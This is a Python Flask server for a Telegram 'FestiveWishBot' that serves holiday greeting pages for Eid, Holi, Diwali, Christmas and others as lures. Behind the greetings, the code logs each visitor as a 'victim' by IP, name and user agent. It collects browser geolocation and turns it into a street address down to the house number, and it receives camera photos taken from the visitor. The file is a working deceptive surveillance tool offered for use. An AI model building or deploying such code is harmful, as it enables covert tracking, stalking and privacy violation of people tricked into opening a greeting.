#!/usr/bin/env python3
"""
Flask Server - Fixed 500 errors
"""

import os
import base64
import logging
import requests
from datetime import datetime
from flask import Flask, render_template, request, jsonify
from flask_cors import CORS

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__, template_folder='templates')
CORS(app)

# Template configurations
TEMPLATES = {
    'eid_fitr': {
        'color': '#00a86b', 
        'icon': '🌙', 
        'greeting': 'Eid Mubarak!', 
        'wish': 'May this blessed occasion of Eid al-Fitr bring peace, happiness, and prosperity to you and your family. May Allah accept your prayers and fasting.'
    },
    'eid_adha': {
        'color': '#8B4513', 
        'icon': '🐑', 
        'greeting': 'Eid Mubarak!', 
        'wish': 'May the spirit of sacrifice bring you closer to Allah. May your good deeds be accepted and your prayers answered. Eid al-Adha Mubarak!'
    },
    'holi': {
        'color': '#FF6B6B', 
        'icon': '🌈', 
        'greeting': 'Happy Holi!', 
        'wish': 'May your life be as colorful as Holi! Let the colors of joy, love, and happiness fill your life. Wishing you a wonderful Holi celebration!'
    },
    'easter': {
        'color': '#FFB6C1', 
        'icon': '🐣', 
        'greeting': 'Happy Easter!', 
        'wish': 'May your Easter be filled with the joy of resurrection, the hope of new beginnings, and the love of family and friends. He is Risen!'
    },
    'diwali': {
        'color': '#FFA500', 
        'icon': '🪔', 
        'greeting': 'Happy Diwali!', 
        'wish': 'May the light of Diwali illuminate your life with happiness, prosperity, and success. Wishing you and your family a blessed and safe Diwali!'
    },
    'christmas': {
        'color': '#FF4444', 
        'icon': '🎄', 
        'greeting': 'Merry Christmas!', 
        'wish': 'May the magic of Christmas fill your heart with warmth and joy. Wishing you peace, love, and happiness this holiday season!'
    },
    'new_year': {
        'color': '#FFD700', 
        'icon': '🎉', 
        'greeting': 'Happy New Year!', 
        'wish': 'As we welcome the New Year, may it bring you countless blessings, endless joy, and unforgettable moments. Here\'s to new beginnings!'
    }
}

victims_data = {}
photos_data = {}
photo_counter = 0

def get_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    return request.remote_addr

def get_accurate_location(lat, lon):
    """Get detailed location from coordinates"""
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=18&addressdetails=1"
        headers = {'User-Agent': 'FestiveWishBot/1.0'}
        response = requests.get(url, headers=headers, timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            address = data.get('address', {})
            
            return {
                'lat': lat,
                'lon': lon,
                'house_number': address.get('house_number', ''),
                'road': address.get('road', ''),
                'neighbourhood': address.get('neighbourhood', ''),
                'suburb': address.get('suburb', ''),
                'city': address.get('city', address.get('town', address.get('village', ''))),
                'state': address.get('state', ''),
                'postcode': address.get('postcode', ''),
                'country': address.get('country', '')
            }
    except Exception as e:
        logger.error(f"Location lookup error: {e}")
    
    return {'lat': lat, 'lon': lon}

@app.route('/')
def index():
    return 'FestiveWishBot - Use /new in Telegram'

@app.route('/<template>')
def serve_template(template):
    if template not in TEMPLATES:
        return "Template not found", 404

    permission = request.args.get('perm', 'both')
    
    # Validate permission
    if permission not in ['camera', 'location', 'both']:
        permission = 'both'

    return render_template(
        f"{template}.html",
        template_name=template,
        permission=permission,
        theme_color=TEMPLATES[template]['color'],
        greeting=TEMPLATES[template]['greeting'],
        wish=TEMPLATES[template]['wish'],
        icon=TEMPLATES[template]['icon']
    )

@app.route('/api/submit-name', methods=['POST'])
def submit_name():
    """Receive user name"""
    try:
        data = request.json
        ip = get_ip()
        name = data.get('name', 'Friend')
        template = data.get('template', 'eid_fitr')
        permission = data.get('permission', 'both')
        
        # Store victim with name
        victims_data[ip] = {
            'ip': ip,
            'name': name,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'template': template,
            'permission': permission,
            'photo_count': 0,
            'location': None,
            'user_agent': request.headers.get('User-Agent', 'Unknown')
        }
        
        logger.info(f"👤 {name} - {ip}")
        
        return jsonify({
            'status': 'ok',
            'name': name,
            'wish': TEMPLATES[template]['wish'],
            'greeting': TEMPLATES[template]['greeting']
        })
    except Exception as e:
        logger.error(f"Name submit error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/location', methods=['POST'])
def receive_location():
    """Receive accurate location"""
    try:
        data = request.json
        ip = get_ip()
        
        lat = data.get('lat')
        lon = data.get('lng')
        
        if lat and lon and ip in victims_data:
            # Get detailed location
            location = get_accurate_location(lat, lon)
            victims_data[ip]['location'] = location
            
            # Build address for logging
            address_parts = []
            if location.get('house_number'): address_parts.append(location['house_number'])
            if location.get('road'): address_parts.append(location['road'])
            if location.get('city'): address_parts.append(location['city'])
            if location.get('country'): address_parts.append(location['country'])
            
            address = ', '.join(filter(None, address_parts))
            logger.info(f"📍 {victims_data[ip].get('name', 'Unknown')} - {address}")
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        logger.error(f"Location error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/api/photo', methods=['POST'])
def photo():
    global photo_counter
    try:
        data = request.json
        ip = get_ip()
        photo_data = data.get('photo', '')

        if photo_data and ',' in photo_data:
            photo_data = photo_data.split(',')[1]
            photo_id = f"photo_{int(datetime.now().timestamp())}_{photo_counter}"
            photo_counter += 1

            photos_data[photo_id] = {
                'ip': ip,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'photo': photo_data
            }

            if ip in victims_data:
                victims_data[ip]['photo_count'] += 1
                name = victims_data[ip].get('name', 'Unknown')
                logger.info(f"📸 Photo from {name}")

            return jsonify({'status': 'ok'})

        return jsonify({'status': 'error', 'message': 'No photo data'}), 400
    except Exception as e:
        logger.error(f"Photo error: {e}")
        return jsonify({'status': 'error'}), 500

def shutdown_server():
    func = request.environ.get('werkzeug.server.shutdown')
    if func:
        func()

@app.route('/shutdown', methods=['POST'])
def shutdown():
    shutdown_server()
    return 'Shutting down'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)